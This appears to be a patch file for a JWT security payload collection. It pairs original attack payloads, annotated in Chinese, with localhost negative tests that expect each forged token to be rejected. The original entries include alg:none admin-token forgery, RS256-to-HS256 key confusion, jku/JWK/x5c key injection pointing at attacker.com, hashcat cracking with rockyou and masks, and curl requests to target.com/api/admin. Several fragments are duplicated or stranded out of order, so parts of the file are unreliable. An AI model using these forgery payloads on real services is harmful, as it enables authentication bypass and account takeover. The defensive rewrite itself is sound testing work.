patches.expectedCommand:
JWT格式: header.payload.signature
解码:
echo "HEADER" | base64 -d
echo "PAYLOAD" | base64 -d
或使用jwt.io
patches.command:
python3 - <<'PY'
import base64, json
token = "eyJhbGciOiJIUzI1NiIsInR5cCI6InBheWxvYWRlcitqd3QifQ.eyJzdWIiOiJwYXlsb2FkZXItdXNlciIsImlzcyI6InBheWxvYWRlci10ZXN0IiwiYXVkIjoicGF5bG9hZGVyLWFwaSJ9.PAYLOADER_TEST_SIGNATURE"
for label, segment in zip(("header", "payload"), token.split(".")[:2]):
    decoded = base64.urlsafe_b64decode(segment + "=" * (-len(segment) % 4))
    print(label, json.loads(decoded))
PY
# Structure inspection does not verify the signature, issuer, audience, time, or token type.

patches.expectedCommand:
修改header为:
{"alg":"none","typ":"JWT"}
Base64编码后构造:
HEADER.PAYLOAD.
(签名部分为空)
patches.command:
python3 - <<'PY'
import base64, json, time
encode = lambda value: base64.urlsafe_b64encode(json.dumps(value, separators=(",", ":")).encode()).rstrip(b"=").decode()
header = {"alg": "none", "typ": "payloader+jwt"}
claims = {"sub": "payloader-negative", "iss": "payloader-test", "aud": "payloader-api", "iat": int(time.time()), "exp": int(time.time()) + 60}
print(encode(header) + "." + encode(claims) + ".")
PY
# Expected: generation succeeds locally; every configured verifier rejects the unsigned token.

patches.expectedCommand:
使用hashcat破解:
hashcat -m 16500 jwt.txt wordlist.txt
使用jwt_tool:
python3 jwt_tool.py JWT_TOKEN -C -d wordlist.txt
patches.command:
python3 - <<'PY'
import base64, hashlib, hmac
message = b"PAYLOADER_TEST_HEADER.PAYLOADER_TEST_PAYLOAD"
approved_secret = b"PAYLOADER_TEST_HS256_SECRET_32_BYTES"
signature = hmac.new(approved_secret, message, hashlib.sha256).digest()
candidates = [b"PAYLOADER_WRONG_A", b"PAYLOADER_WRONG_B", approved_secret]
matches = [candidate.decode() for candidate in candidates if hmac.compare_digest(hmac.new(candidate, message, hashlib.sha256).digest(), signature)]
print({"candidate_count": len(candidates), "matches": matches})
PY
# Fixed three-candidate owned-token audit; no masks, general wordlists, or production material.

work_dir="$(mktemp -d)"
trap 'rm -rf "$work_dir"' EXIT
openssl genpkey -algorithm RSA -pkeyopt rsa_keygen_bits:2048 -out "$work_dir/test-private.pem"
openssl pkey -in "$work_dir/test-private.pem" -pubout -out "$work_dir/test-public.pem"
python3 - "$work_dir/test-public.pem" <<'PY'
import base64, hashlib, hmac, json, sys, time
encode = lambda value: base64.urlsafe_b64encode(json.dumps(value, separators=(",", ":")).encode()).rstrip(b"=").decode()
public_key = open(sys.argv[1], "rb").read()
header = encode({"alg": "HS256", "typ": "payloader+jwt", "kid": "PAYLOADER_RSA_TEST_KEY"})
claims = encode({"sub": "payloader-negative", "iss": "payloader-test", "aud": "payloader-api", "iat": int(time.time()), "exp": int(time.time()) + 60})
signature = base64.urlsafe_b64encode(hmac.new(public_key, (header + "." + claims).encode(), hashlib.sha256).digest()).rstrip(b"=").decode()
print(header + "." + claims + "." + signature)
PY
# This historical confusion token is generated only from a temporary local public key; a modern verifier rejects it.

python3 - <<'PY'
import base64, hashlib, hmac, json, time, urllib.error, urllib.request
encode = lambda value: base64.urlsafe_b64encode(json.dumps(value, separators=(",", ":")).encode()).rstrip(b"=").decode()
secret = b"PAYLOADER_TEST_HS256_SECRET_32_BYTES"
now = int(time.time())
cases = {
    "valid": {"sub":"payloader-user","iss":"payloader-test","aud":"payloader-api","iat":now,"exp":now+60},
    "wrong-issuer": {"sub":"payloader-user","iss":"payloader-other","aud":"payloader-api","iat":now,"exp":now+60},
    "wrong-audience": {"sub":"payloader-user","iss":"payloader-test","aud":"payloader-other","iat":now,"exp":now+60},
    "expired": {"sub":"payloader-user","iss":"payloader-test","aud":"payloader-api","iat":now-120,"exp":now-60},
}
for name, claims in cases.items():
    header = encode({"alg":"HS256","typ":"payloader+jwt","kid":"PAYLOADER_TEST_KEY"})
    payload = encode(claims)
    signature = base64.urlsafe_b64encode(hmac.new(secret, (header+"."+payload).encode(), hashlib.sha256).digest()).rstrip(b"=").decode()
    request = urllib.request.Request("http://127.0.0.1:8080/api/marker", headers={"Authorization":"Bearer "+header+"."+payload+"."+signature})
    try:
        status = urllib.request.urlopen(request, timeout=5).status
    except urllib.error.HTTPError as error:
        status = error.code
    print(name, status)
PY
# Only the valid profile reaches the read-only marker; issuer, audience, and expiration failures are independent.

patches.expectedCommand:
# JWK内嵌公钥注入:
# 在JWT Header中嵌入攻击者的公钥:
{"alg":"RS256","typ":"JWT","jwk":{"kty":"RSA","n":"attacker_n","e":"AQAB"}}
# 服务端使用Header中的JWK验证签名

# JKU远程密钥集注入:
{"alg":"RS256","typ":"JWT","jku":"http://attacker.com/.well-known/jwks.json"}
# 服务端从攻击者控制的URL获取密钥
patches.command:
python3 - <<'PY'
import base64, hashlib, hmac, json, time, urllib.error, urllib.request
encode = lambda value: base64.urlsafe_b64encode(json.dumps(value, separators=(",", ":")).encode()).rstrip(b"=").decode()
header = encode({"alg":"HS256","typ":"payloader+jwt","jwk":{"kty":"oct","kid":"PAYLOADER_UNTRUSTED","k":"UEFZTE9BREVSX1VOVFJVU1RFRA"}})
payload = encode({"sub":"payloader-negative","iss":"payloader-test","aud":"payloader-api","iat":int(time.time()),"exp":int(time.time())+60})
signature = base64.urlsafe_b64encode(hmac.new(b"PAYLOADER_UNTRUSTED", (header+"."+payload).encode(), hashlib.sha256).digest()).rstrip(b"=").decode()
request = urllib.request.Request("http://127.0.0.1:8080/api/marker", headers={"Authorization":"Bearer "+header+"."+payload+"."+signature})
try:
    print(urllib.request.urlopen(request, timeout=5).status)
except urllib.error.HTTPError as error:
    print(error.code)
PY
# Expected: the token-supplied JWK is ignored and the token is rejected because no configured key matches.

patches.expectedCommand:
# 生成自签名证书:
openssl req -x509 -nodes -newkey rsa:2048 -keyout attacker.key -out attacker.crt -subj "/CN=attacker"

# 构造JWT Header:
{"alg":"RS256","x5c":["ATTACKER_CERT_BASE64"]}

# 用攻击者私钥签名，x5c中放入攻击者证书
# 服务端从x5c提取公钥验证签名，攻击者自签即可通过

# 使用jwt_tool:
python3 jwt_tool.py <token> -X s -pr attacker.key
patches.command:
work_dir="$(mktemp -d)"
trap 'rm -rf "$work_dir"' EXIT
openssl req -x509 -nodes -newkey rsa:2048 -keyout "$work_dir/key.pem" -out "$work_dir/cert.pem" -days 1 -subj "/CN=payloader-untrusted"
python3 - "$work_dir/key.pem" "$work_dir/cert.pem" <<'PY'
import base64, json, subprocess, sys, time, urllib.error, urllib.request
encode = lambda raw: base64.urlsafe_b64encode(raw).rstrip(b"=").decode()
certificate = subprocess.check_output(["openssl","x509","-in",sys.argv[2],"-outform","DER"])
header = encode(json.dumps({"alg":"RS256","typ":"payloader+jwt","x5c":[base64.b64encode(certificate).decode()]}, separators=(",",":")).encode())
payload = encode(json.dumps({"sub":"payloader-negative","iss":"payloader-test","aud":"payloader-api","iat":int(time.time()),"exp":int(time.time())+60}, separators=(",",":")).encode())
signing_input = (header+"."+payload).encode()
signature = subprocess.check_output(["openssl","dgst","-sha256","-sign",sys.argv[1]], input=signing_input)
token = header+"."+payload+"."+encode(signature)
request = urllib.request.Request("http://127.0.0.1:8080/api/marker", headers={"Authorization":"Bearer "+token})
try:
    print(urllib.request.urlopen(request, timeout=5).status)
except urllib.error.HTTPError as error:
    print(error.code)
PY
# Expected: a correctly signed token with an untrusted self-signed x5c chain is rejected.

patches.expectedCommand:
# 修改payload提权
# 原始payload
{"sub":"user","role":"user","iat":1516239022}

# 修改为
{"sub":"admin","role":"admin","iat":1516239022}

# 完整攻击
import base64, json
header = base64.urlsafe_b64encode(b'{"alg":"none","typ":"JWT"}').decode().rstrip("=")
payload = base64.urlsafe_b64encode(b'{"sub":"admin","role":"admin"}').decode().rstrip("=")
token = header + "." + payload + "."
print(token)
patches.command:
python3 - <<'PY'
import base64, json, time
encode = lambda value: base64.urlsafe_b64encode(json.dumps(value, separators=(",", ":")).encode()).rstrip(b"=").decode()
for subject in ("payloader-user", "payloader-negative"):
    claims = {"sub":subject,"iss":"payloader-test","aud":"payloader-api","iat":int(time.time()),"exp":int(time.time())+60}
    print(encode({"alg":"none","typ":"payloader+jwt"})+"."+encode(claims)+".")
PY
# Claim changes do not matter because every unsigned token is rejected before authorization.

curl -H "Authorization: Bearer <MALICIOUS_TOKEN>" http://target.com/api/admin

# 空签名测试
curl -H "Authorization: Bearer eyJhbGciOiJub25lIiwidHlwIjoiSldUIn0.eyJzdWIiOiJhZG1pbiIsInJvbGUiOiJhZG1pbiJ9." http://target.com/api/admin
patches.command:
python3 - <<'PY'
import base64, json, time, urllib.error, urllib.request
encode = lambda value: base64.urlsafe_b64encode(json.dumps(value, separators=(",", ":")).encode()).rstrip(b"=").decode()
token = encode({"alg": "none", "typ": "payloader+jwt"}) + "." + encode({"sub": "payloader-negative", "iss": "payloader-test", "aud": "payloader-api", "iat": int(time.time()), "exp": int(time.time()) + 60}) + "."
request = urllib.request.Request("http://127.0.0.1:8080/api/marker", headers={"Authorization": "Bearer " + token})
try:
    print(urllib.request.urlopen(request, timeout=5).status)
except urllib.error.HTTPError as error:
    print(error.code)
PY
# Expected: 401 or 403 and no authenticated principal.

python3 - <<'PY'
import base64, json, time, urllib.error, urllib.request
encode = lambda value: base64.urlsafe_b64encode(json.dumps(value, separators=(",", ":")).encode()).rstrip(b"=").decode()
claims = encode({"sub": "payloader-negative", "iss": "payloader-test", "aud": "payloader-api", "iat": int(time.time()), "exp": int(time.time()) + 60})
for algorithm in ("none", "None", "NONE", ""):
    token = encode({"alg": algorithm, "typ": "payloader+jwt"}) + "." + claims + "."
    request = urllib.request.Request("http://127.0.0.1:8080/api/marker", headers={"Authorization": "Bearer " + token})
    try:
        status = urllib.request.urlopen(request, timeout=5).status
    except urllib.error.HTTPError as error:
        status = error.code
    print(repr(algorithm), status)
PY
# Fixed four-case budget; every unsigned or unapproved algorithm is rejected.

patches.expectedCommand:
# 空签名
header.payload.

# 任意签名
header.payload.anysignature

# 使用原始签名
# 某些库会忽略签名验证
patches.command:
python3 - <<'PY'
import urllib.error, urllib.request
tokens = (
    "PAYLOADER_HEADER.PAYLOADER_PAYLOAD.",
    "PAYLOADER_HEADER.PAYLOADER_PAYLOAD.PAYLOADER_ARBITRARY",
    "PAYLOADER_HEADER.PAYLOADER_PAYLOAD",
)
for token in tokens:
    request = urllib.request.Request("http://127.0.0.1:8080/api/marker", headers={"Authorization": "Bearer " + token})
    try:
        status = urllib.request.urlopen(request, timeout=5).status
    except urllib.error.HTTPError as error:
        status = error.code
    print(status)
PY
# Empty, arbitrary, and missing signature segments are all rejected before claim use.

echo | openssl s_client -connect target.com:443 2>/dev/null | openssl x509 -pubkey -noout

patches.command:
fixture_dir=".payloader-jwt-fixture"
mkdir -p "$fixture_dir"
openssl genpkey -algorithm RSA -pkeyopt rsa_keygen_bits:2048 -out "$fixture_dir/private.pem"
openssl pkey -in "$fixture_dir/private.pem" -pubout -out "$fixture_dir/public.pem"
openssl pkey -pubin -in "$fixture_dir/public.pem" -outform DER | openssl dgst -sha256
# Disposable local fixture only; remove the directory after the batch.

patches.expectedCommand:
# 使用构造的Token
curl -H "Authorization: Bearer <HS256_TOKEN>" http://target.com/api/admin

# Python脚本
import requests
headers = {"Authorization": f"Bearer {token}"}
response = requests.get("http://target.com/api/admin", headers=headers)
print(response.text)
patches.command:
curl -sS --max-time 5 -o /dev/null -w "%{http_code}\n" -H "Authorization: Bearer PAYLOADER_ALG_CONFUSION_TEST_TOKEN" http://127.0.0.1:8080/api/marker
# Expected: 401 or 403 because the verifier pins RS256 and refuses an RSA public key as an HMAC secret.

python3 - <<'PY'
import base64, hashlib, hmac, json, time, urllib.error, urllib.request
encode = lambda value: base64.urlsafe_b64encode(json.dumps(value, separators=(",", ":")).encode()).rstrip(b"=").decode()
secret = b"PAYLOADER_TEST_HS256_SECRET_32_BYTES"
kids = ("PAYLOADER_TEST_KEY", "PAYLOADER_UNKNOWN_KEY", "PAYLOADER_DISABLED_KEY", "PAYLOADER_KEY_" + "X" * 80)
for kid in kids:
    header = encode({"alg": "HS256", "typ": "payloader+jwt", "kid": kid})
    claims = encode({"sub": "payloader-user", "iss": "payloader-test", "aud": "payloader-api", "iat": int(time.time()), "exp": int(time.time()) + 60})
    signature = base64.urlsafe_b64encode(hmac.new(secret, (header + "." + claims).encode(), hashlib.sha256).digest()).rstrip(b"=").decode()
    request = urllib.request.Request("http://127.0.0.1:8080/api/marker", headers={"Authorization": "Bearer " + header + "." + claims + "." + signature})
    try:
        status = urllib.request.urlopen(request, timeout=5).status
    except urllib.error.HTTPError as error:
        status = error.code
    print(kid[:32], status)
PY
# Only the configured opaque key ID may reach signature verification; unknown, disabled, and overlong identifiers are rejected.

    print(label, json.loads(decoded))
PY
# Structure inspection does not verify the signature, issuer, audience, time, or token type.

patches.expectedCommand:
import jwt
import json

# 读取RSA公钥
with open("pubkey.pem", "rb") as f:
    public_key = f.read()

# 用公钥作为HMAC密钥签名
forged_payload = {
    "user": "admin",
    "role": "admin",
    "iat": 1707811200,
    "exp": 1999999999
}

# 将算法从RS256切换为HS256
forged_token = jwt.encode(
    forged_payload,
    public_key,        # RSA公钥作为HMAC密钥
    algorithm="HS256"  # 改为HMAC算法
)
print(forged_token)
patches.command:
work_dir="$(mktemp -d)"
trap 'rm -rf "$work_dir"' EXIT
openssl genpkey -algorithm RSA -pkeyopt rsa_keygen_bits:2048 -out "$work_dir/test-private.pem"
openssl pkey -in "$work_dir/test-private.pem" -pubout -out "$work_dir/test-public.pem"
python3 - "$work_dir/test-public.pem" <<'PY'
import base64, hashlib, hmac, json, sys, time
encode = lambda value: base64.urlsafe_b64encode(json.dumps(value, separators=(",", ":")).encode()).rstrip(b"=").decode()
public_key = open(sys.argv[1], "rb").read()
header = encode({"alg": "HS256", "typ": "payloader+jwt", "kid": "PAYLOADER_RSA_TEST_KEY"})
claims = encode({"sub": "payloader-negative", "iss": "payloader-test", "aud": "payloader-api", "iat": int(time.time()), "exp": int(time.time()) + 60})
signature = base64.urlsafe_b64encode(hmac.new(public_key, (header + "." + claims).encode(), hashlib.sha256).digest()).rstrip(b"=").decode()
print(header + "." + claims + "." + signature)
PY
# This historical confusion token is generated only from a temporary local public key; a modern verifier rejects it.

# DER格式(二进制)

openssl pkey -pubin -in .payloader-jwt-fixture/public.pem -outform DER -out .payloader-jwt-fixture/public.der
openssl dgst -sha256 .payloader-jwt-fixture/public.pem .payloader-jwt-fixture/public.der
# Format differences are measured on one local public key and are never treated as separate trusted keys.

patches.command:
python3 - <<'PY'
import base64, json
token = "eyJhbGciOiJIUzI1NiIsInR5cCI6InBheWxvYWRlcitqd3QifQ.eyJzdWIiOiJwYXlsb2FkZXItdXNlciIsImlzcyI6InBheWxvYWRlci10ZXN0IiwiYXVkIjoicGF5bG9hZGVyLWFwaSJ9.PAYLOADER_TEST_SIGNATURE"
for label, segment in zip(("header", "payload"), token.split(".")[:2]):
    decoded = base64.urlsafe_b64decode(segment + "=" * (-len(segment) % 4))

patches.expectedCommand:
# hashcat模式16500 = JWT
hashcat -m 16500 -a 0 jwt.txt /usr/share/wordlists/rockyou.txt

# jwt.txt内容为完整的JWT字符串

# 使用规则加速
hashcat -m 16500 -a 0 jwt.txt rockyou.txt -r /usr/share/hashcat/rules/best64.rule

# 掩码暴力破解(8位数字密钥)
hashcat -m 16500 -a 3 jwt.txt ?d?d?d?d?d?d?d?d
patches.command:
python3 - <<'PY'
import base64, hashlib, hmac
message = b"PAYLOADER_TEST_HEADER.PAYLOADER_TEST_PAYLOAD"
approved_secret = b"PAYLOADER_TEST_HS256_SECRET_32_BYTES"
signature = hmac.new(approved_secret, message, hashlib.sha256).digest()
candidates = [b"PAYLOADER_WRONG_A", b"PAYLOADER_WRONG_B", approved_secret]
matches = [candidate.decode() for candidate in candidates if hmac.compare_digest(hmac.new(candidate, message, hashlib.sha256).digest(), signature)]
print({"candidate_count": len(candidates), "matches": matches})
PY
# Fixed three-candidate owned-token audit; no masks, general wordlists, or production material.

patches.expectedCommand:
from cryptography.hazmat.primitives.asymmetric import rsa
from cryptography.hazmat.primitives import serialization
import json, base64

# 生成RSA密钥对
private_key = rsa.generate_private_key(public_exponent=65537, key_size=2048)
public_key = private_key.public_key()

# 导出PEM格式
with open("attacker_private.pem", "wb") as f:
    f.write(private_key.private_bytes(
        serialization.Encoding.PEM,
        serialization.PrivateFormat.PKCS8,
        serialization.NoEncryption()
    ))

# 生成JWKS格式公钥
numbers = public_key.public_numbers()
jwks = {"keys": [{"kty": "RSA", "kid": "attacker-key-1",
    "n": base64.urlsafe_b64encode(numbers.n.to_bytes(256, "big")).rstrip(b"=").decode(),
    "e": base64.urlsafe_b64encode(numbers.e.to_bytes(3, "big")).rstrip(b"=").decode(),
    "use": "sig", "alg": "RS256"}]}

with open("jwks.json", "w") as f:
    json.dump(jwks, f)
patches.command:

mkdir -p "$fixture_dir"
openssl genpkey -algorithm RSA -pkeyopt rsa_keygen_bits:2048 -out "$fixture_dir/private.pem"
openssl pkey -in "$fixture_dir/private.pem" -pubout -out "$fixture_dir/public.pem"
openssl pkey -pubin -in "$fixture_dir/public.pem" -outform DER | openssl dgst -sha256
# Disposable local fixture only; remove the directory after the batch.

# 用攻击者私钥签名

patches.command:
python3 - <<'PY'
import base64, json
from cryptography.hazmat.primitives import serialization
key = serialization.load_pem_public_key(open(".payloader-jwt-fixture/public.pem", "rb").read())
numbers = key.public_numbers()
encode = lambda value: base64.urlsafe_b64encode(value).rstrip(b"=").decode()
size = (numbers.n.bit_length() + 7) // 8
jwk = {"kty":"RSA","use":"sig","alg":"RS256","kid":"PAYLOADER_LOCAL_KEY","n":encode(numbers.n.to_bytes(size,"big")),"e":encode(numbers.e.to_bytes((numbers.e.bit_length()+7)//8,"big"))}
open(".payloader-jwt-fixture/jwks.json","w",encoding="utf-8").write(json.dumps({"keys":[jwk]}))
print(jwk["kid"])
PY
# Builds a localhost-only JWK Set from the disposable public key.
python3 -m http.server 18080 --bind 127.0.0.1 --directory .payloader-jwt-fixture > .payloader-jwt-fixture/server.log 2>&1 &
server_pid=$!
trap 'kill "$server_pid" 2>/dev/null' EXIT
curl -sS --max-time 5 http://127.0.0.1:18080/jwks.json
kill "$server_pid"
wait "$server_pid" 2>/dev/null || true
trap - EXIT
# One bounded localhost fetch proves the fixture; no remote key URL is contacted.
